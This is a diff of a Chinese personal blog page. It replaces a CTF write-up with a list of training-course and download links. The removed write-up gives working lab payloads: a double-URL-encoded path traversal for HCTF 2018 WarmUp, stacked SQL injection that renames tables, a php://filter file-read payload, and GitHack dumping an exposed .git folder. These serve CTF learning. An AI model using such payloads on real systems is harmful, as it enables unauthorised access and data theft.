@@ -4,15 +4,11 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Buuctf笔记, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
+    <meta name="keywords" content="千锋资源, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="WEB第一题:[HCTF 2018]WarmUp这里懒得上传图片了，所以就直接笔记了
-源代码里面有1.source.php，所以打开以后还会发先2.hint.php
-1打开后会发现是代码审计
-&amp;lt;?php
-    highlight_f">
+    <meta name="description" content="千峰在线学习地址：在线观看地址：http://www.mobiletrain.org/testing/video-list3.shtml官方B站地址：https://space.bilibili.com/146668655官方知乎地址：ht">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Buuctf笔记 | 网安小白</title>
+    <title>千锋资源 | 网安小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -319,13 +315,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/30.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/33.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Buuctf笔记
+                        千锋资源
                     </div>
                 </div>
             </div>
@@ -436,12 +432,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/buuctf/" target="_blank">
-                            <span class="chip bg-color">buuctf</span>
-                        </a>
-                        
-                        <a href="/tags/web入门/" target="_blank">
-                            <span class="chip bg-color">web入门</span>
+                        <a href="/tags/学习资料/" target="_blank">
+                            <span class="chip bg-color">学习资料</span>
                         </a>
                         
                     </div>
@@ -449,22 +441,13 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fa fa-bookmark fa-fw icon-category"></i>
-                        
-                        <a href="/categories/CTF/" class="post-category" target="_blank">
-                            CTF
-                        </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-21
+                    2021-01-14
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -478,14 +461,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    506
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    2 分
                 </div>
                 
                 
@@ -501,223 +484,22 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="第一题-HCTF-2018-WarmUp"><a href="#第一题-HCTF-2018-WarmUp" class="headerlink" title="第一题:[HCTF 2018]WarmUp"></a>第一题:[HCTF 2018]WarmUp</h2><p>这里懒得上传图片了，所以就直接笔记了</p>
-<p>源代码里面有1.source.php，所以打开以后还会发先2.hint.php</p>
-<p>1打开后会发现是代码审计</p>
-<pre><code>&lt;?php
-    highlight_file(__FILE__);
-    class emmm
-    {
-        public static function checkFile(&amp;$page)
-        {
-            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-            if (! isset($page) || !is_string($page)) {
-                echo &quot;you can&#39;t see it&quot;;
-                return false;
-                /**isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误。is_string用来检查传入的值是否为字符串**/
-            }
-            if (in_array($page, $whitelist)) {
-                return true;
-                /**in_array — 检查数组中是否存在某个值，这里判断page是否存在于whitelist数 组 中 ， 存 在 则 返 回 true**/
-            }
-
-            $_page = mb_substr(
-                $page,
-                0,
-                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-            );
-            /**
-            对mb_substr函数的解释：函数返回字符串的一部分，针对中文
-            &lt;?php
-               echo mb_substr(&quot;菜鸟教程&quot;, 0, 2);
-               // 输出：菜鸟
-            ?&gt;
-            mb_strpos (要被检查的字符串,要搜索的字符串)
-            &lt;?php
-             $str = &#39;http://www.feiniaomy.com&#39;;
-             echo mb_strpos($str,&#39;niao&#39;);
-            ?&gt;
-            输出结果：14
-            这里整个嵌套意思是截取page中’?‘前部分
-             **/
-            if (in_array($_page, $whitelist)) {
-                return true;
-            }
-
-            $_page = urldecode($page);
-            $_page = mb_substr(
-                $_page,
-                0,
-                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-            );
-            /**
-            这里也就是说进行了两次url解码，一次是服务器自动解码，一次是此处解码
-            **/
-            if (in_array($_page, $whitelist)) {
-                return true;
-            }
-            echo &quot;you can&#39;t see it&quot;;
-            return false;
-        }
-    }
-
-    if (! empty($_REQUEST[&#39;file&#39;])
-        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
-        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])#这段代码意思就是响应的file参数不能为空，而且必须是是字符串，并且还要检查在checkfile里面检查，这里将我们的的值传到emmm类里面的checkFile函数，这三个值通过&amp;&amp;逻辑与运算符连接也就是要求这块函数的返回值要全为真才能执行if里面的文件包含的代码 否则就执行else里面的图片代码#
-    ) {
-        include $_REQUEST[&#39;file&#39;];
-        exit;
-    } else {
-        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-    }  
-?&gt; </code></pre><p>2打开后会发现：flag not here, and flag in ffffllllaaaagggg</p>
-<p>也就是说flag在这个文件里面</p>
-<p>所以说这个经过分析完以后，tmd这个题就很简单了，就是老结构/?file=source.php?/../../../../ffffllllaaaagggg</p>
-<p>然后就是对？进行url编码%253F这里../就是</p>
-<p>所以就是/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p>
-<p>同样/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg都可以</p>
-<p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p>
-<p>没什么东西</p>
-<p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p>
-<pre><code>array(2) {
-  [0]=&gt;
-  string(1) &quot;1&quot;
-  [1]=&gt;
-  string(7) &quot;hahahah&quot;
-}</code></pre><p>输入1’</p>
-<pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p>
-<p>输入：1’ or 1=1#</p>
-<pre><code>array(2) {
-  [0]=&gt;
-  string(1) &quot;1&quot;
-  [1]=&gt;
-  string(7) &quot;hahahah&quot;
-}
-
-array(2) {
-  [0]=&gt;
-  string(1) &quot;2&quot;
-  [1]=&gt;
-  string(12) &quot;miaomiaomiao&quot;
-}
-
-array(2) {
-  [0]=&gt;
-  string(6) &quot;114514&quot;
-  [1]=&gt;
-  string(2) &quot;ys&quot;
-}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p>
-<p>输入：1’ union select 1,2#</p>
-<pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p>
-<p>考虑堆叠注入（学到了）：</p>
-<p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p>
-<p>输入：1’;show databases;#</p>
-<pre><code>array(1) {
-  [0]=&gt;
-  string(11) &quot;ctftraining&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(18) &quot;information_schema&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(5) &quot;mysql&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(18) &quot;performance_schema&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(9) &quot;supersqli&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(4) &quot;test&quot;
-}</code></pre><p>输入：1’;show tables from supersqli;#</p>
-<pre><code>array(1) {
-  [0]=&gt;
-  string(16) &quot;1919810931114514&quot;
-}
-
-array(1) {
-  [0]=&gt;
-  string(5) &quot;words&quot;
-}</code></pre><p>输入：1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p>
-<pre><code>array(6) {
-  [0]=&gt;
-  string(4) &quot;flag&quot;
-  [1]=&gt;
-  string(12) &quot;varchar(100)&quot;
-  [2]=&gt;
-  string(2) &quot;NO&quot;
-  [3]=&gt;
-  string(0) &quot;&quot;
-  [4]=&gt;
-  NULL
-  [5]=&gt;
-  string(0) &quot;&quot;
-}</code></pre><p>输入：1’;show columns from words;#</p>
-<pre><code>array(6) {
-  [0]=&gt;
-  string(2) &quot;id&quot;
-  [1]=&gt;
-  string(7) &quot;int(10)&quot;
-  [2]=&gt;
-  string(2) &quot;NO&quot;
-  [3]=&gt;
-  string(0) &quot;&quot;
-  [4]=&gt;
-  NULL
-  [5]=&gt;
-  string(0) &quot;&quot;
-}
-
-array(6) {
-  [0]=&gt;
-  string(4) &quot;data&quot;
-  [1]=&gt;
-  string(11) &quot;varchar(20)&quot;
-  [2]=&gt;
-  string(2) &quot;NO&quot;
-  [3]=&gt;
-  string(0) &quot;&quot;
-  [4]=&gt;
-  NULL
-  [5]=&gt;
-  string(0) &quot;&quot;
-}</code></pre><p>1’;rename tables <code>words</code> to <code>words1</code>;rename tables <code>1919810931114514</code> to <code>words</code>; alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#</p>
-<p>然后1’ or 1=1#</p>
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p>
-<p>特点：文件包含，/?file=flag.php</p>
-<p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p>
-<p>base64得：</p>
-<pre><code>&lt;?php
-echo &quot;Can you find out the flag?&quot;;
-//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p>
-<p>Git测试</p>
-<p>Hello, CTFer!</p>
-<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
-<hr>
-<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p>
-<p>very easy</p>
-<p>看网上说这是git测试，听别人看书说要用一个工具叫：scrabble，但是我没有书，所以我就不和他用一样的工具：Githack</p>
-<p>kali没有自己下载：</p>
-<pre><code>git clone https://github.com/BugScanTeam/GitHack
-cd GitHack
-python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.git</code></pre><p>然后就发现<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50926_2.png" alt></p>
-<p>打开以后</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50927_3.png" alt></p>
-<p>n1book{git_looks_s0_easyfun}</p>
-<p>完事了</p>
+                <h3 id="千峰在线学习地址："><a href="#千峰在线学习地址：" class="headerlink" title="千峰在线学习地址："></a><strong>千峰在线学习地址：</strong></h3><p><strong>在线观看地址：</strong><a href="http://www.mobiletrain.org/testing/video-list3.shtml" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list3.shtml</a><br><strong>官方B站地址：</strong><a href="https://space.bilibili.com/146668655" target="_blank" rel="noopener">https://space.bilibili.com/146668655</a><br><strong>官方知乎地址：</strong><a href="https://www.zhihu.com/org/qian-feng-jiao-yu-39" target="_blank" rel="noopener">https://www.zhihu.com/org/qian-feng-jiao-yu-39</a></p>
+<h3 id="各学科学习资源："><a href="#各学科学习资源：" class="headerlink" title="各学科学习资源："></a><strong>各学科学习资源：</strong></h3><p><strong>Java：</strong><a href="http://www.mobiletrain.org/testing/video-list-java.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-java.shtml?ssss</a></p>
+<p><strong>HTML5/web前端：</strong><a href="http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss</a></p>
+<p><strong>Python：</strong><a href="http://www.mobiletrain.org/testing/video-list-python.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-python.shtml?ssss</a></p>
+<p><strong>UI设计：</strong><a href="http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss</a></p>
+<p><strong>Linux/云计算：</strong><a href="http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss</a></p>
+<p><strong>软件测试：</strong><a href="http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss</a></p>
+<p><strong>大数据：</strong><a href="http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss</a></p>
+<p><strong>物联网：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss</a></p>
+<p><strong>网络安全：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss</a></p>
+<p><strong>互联网营销：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss</a></p>
+<p><strong>go语言：</strong><a href="http://www.mobiletrain.org/testing/video-list-go.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-go.shtml?ssss</a></p>
+<p><strong>Unity/游戏开发：</strong><a href="http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss</a></p>
+<p><strong>PHP：</strong><a href="http://www.mobiletrain.org/testing/video-list-php.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-php.shtml?ssss</a></p>
+<h3 id="计算机等级考试资源："><a href="#计算机等级考试资源：" class="headerlink" title="计算机等级考试资源："></a><strong>计算机等级考试资源：</strong></h3><p><strong>2020版_全国计算机等级考试二级Java程序设计</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1sT4y1F7Ka" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1sT4y1F7Ka</a><br>网盘链接：<a href="https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ</a> 提取码: 2igi<br><strong>2020版_全国计算机Python二级真题讲解</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1qy4y1B7wN" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1qy4y1B7wN</a><br>网盘链接：<a href="https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ</a> 提取码: fk9x<br><strong>2020版_全国计算机Web二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1GV411y7VT" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1GV411y7VT</a><br>网盘链接：<a href="https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg</a> 提取码: fjxb<br><strong>2020年计算机全国等级考试二级C语言教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ht4y1i7tx" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ht4y1i7tx</a><br>网盘链接：<a href="https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA" target="_blank" rel="noopener">https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA</a> 提取码: 5v8p<br><strong>2020版_全国计算机MySQL二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ni4y137A7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ni4y137A7</a><br>网盘链接：<a href="https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg</a> 提取码: i622<br><strong>2020版全国计算机一级WPS Office全套考试教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1dK411A7fu" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1dK411A7fu</a><br>网盘链接：<a href="https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q</a> 提取码: 6ngp</p>
+<h3 id="其他资源："><a href="#其他资源：" class="headerlink" title="其他资源："></a><strong>其他资源：</strong></h3><p><strong>最新千锋PMP项目管理视频 ：</strong><a href="https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg</a> 提取码: m47c<br><strong>【源码】千锋教程书籍系列 ：</strong><a href="https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA" target="_blank" rel="noopener">https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA</a></p>
 
             </div>
             <hr />
@@ -876,9 +658,9 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Buuctf笔记》
+                    《千锋资源》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/21/buuctf-bi-ji/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/01/14/qian-feng-zi-yuan/" property="cc:attributionName"
                rel="cc:attributionURL">
                 杨云凯
             </a> 采用
@@ -919,7 +701,7 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
         repo: 'iceberg404.github.io',
         owner: 'iceberg404',
         admin: "godweiyang",
-        id: '2020/12/21/buuctf-bi-ji/',
+        id: '2021/01/14/qian-feng-zi-yuan/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1202,54 +984,41 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/12/23/ctfhub-sui-bi/">
+                <a href="/2021/01/14/qian-feng-zi-yuan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CtfHub随笔">
+                        <img src="/medias/featureimages/33.jpg" class="responsive-img" alt="千锋资源">
                         
-                        <span class="card-title">CtfHub随笔</span>
+                        <span class="card-title">千锋资源</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            WebWeb前置技能HTTP协议请求方式题目：
-
-HTTP Method is GET
-Use CTF**B Method, I will give you flag.
-Hint: If you got 「HTTP Method Not A
+                            千峰在线学习地址：在线观看地址：http://www.mobiletrain.org/testing/video-list3.shtml官方B站地址：https://space.bilibili.com/146668655官方知乎地址：ht
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-14
+                            </span>
                         <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF/" class="post-category" target="_blank">
-                                    CTF
-                                </a>
-                            
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/入门/" target="_blank">
-                        <span class="chip bg-color">入门</span>
-                    </a>
-                    
-                    <a href="/tags/ctfhub/" target="_blank">
-                        <span class="chip bg-color">ctfhub</span>
+                    <a href="/tags/学习资料/" target="_blank">
+                        <span class="chip bg-color">学习资料</span>
                     </a>
                     
                 </div>
@@ -1263,26 +1032,32 @@ Hint: If you got 「HTTP Method Not A
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/19/lampiao-shen-tou-chu-tan/">
+                <a href="/2021/01/09/zicoshop/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/39.jpg" class="responsive-img" alt="lampiao渗透测试初探">
+                        <img src="/medias/featureimages/36.jpg" class="responsive-img" alt="ZicoShop">
                         
-                        <span class="card-title">lampiao渗透测试初探</span>
+                        <span class="card-title">ZicoShop</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            lampiao靶机渗透测试笔记简单介绍：Would you like to keep hacking in your own lab?
-
-Try this brand new vulnerable machine! &quot;Lampiã
+                            简介：
+是一个电子商务建站技术网站Zico-Shop
+主要功能：
+建站技术
+网店案例
+发现服务：补充：
+-sV:V扫描到的服务的端口号，apache 2.4
+-sT:TCP -sS:SYN  -A：显示详细的信息
+得到目标主机开放端口和操作
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-19
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-09
                             </span>
                         <span class="publish-author">
                             
